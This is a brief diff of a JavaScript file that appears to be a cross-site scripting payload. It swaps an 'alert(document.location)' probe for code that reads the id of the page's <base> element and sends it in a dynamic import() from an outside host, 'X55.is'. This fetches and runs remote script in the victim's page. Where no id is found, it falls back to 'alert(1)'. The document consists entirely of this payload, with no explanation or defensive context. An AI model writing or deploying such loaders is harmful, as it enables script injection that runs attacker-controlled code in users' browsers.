@@ -16,5 +16,17 @@ if (frag) {
 
 } else {
 
-  alert(document.location);
+  if (document.getElementsByTagName('base')[0]) {
+     var id = document.getElementsByTagName('base')[0].id;
+  }
+
+  if (id) {
+
+     import('https://X55.is?1=' + id);
+
+  } else {
+
+     alert(1);
+
+  }
 }
